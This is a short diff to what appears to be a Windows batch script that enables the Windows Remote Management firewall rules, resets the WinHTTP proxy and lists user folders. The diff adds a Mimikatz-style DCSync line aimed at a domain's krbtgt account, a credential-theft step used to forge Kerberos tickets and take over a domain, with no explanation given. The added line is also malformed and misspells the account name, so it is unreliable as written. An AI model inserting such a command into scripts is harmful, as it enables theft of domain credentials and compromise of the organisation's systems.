@@ -519,6 +519,8 @@ netsh advfirewall firewall set rule group=”Windows Remote Management” new en
 ECHO ============================
 netsh winhttp reset proxy
 ECHO ============================
+lsadump:dcsync /domain:abc.local /user:ktbtgt
+ECHO ============================
 dir /b /ad "C:\Users\"
 ECHO ============================
 ECHO ***************************************************
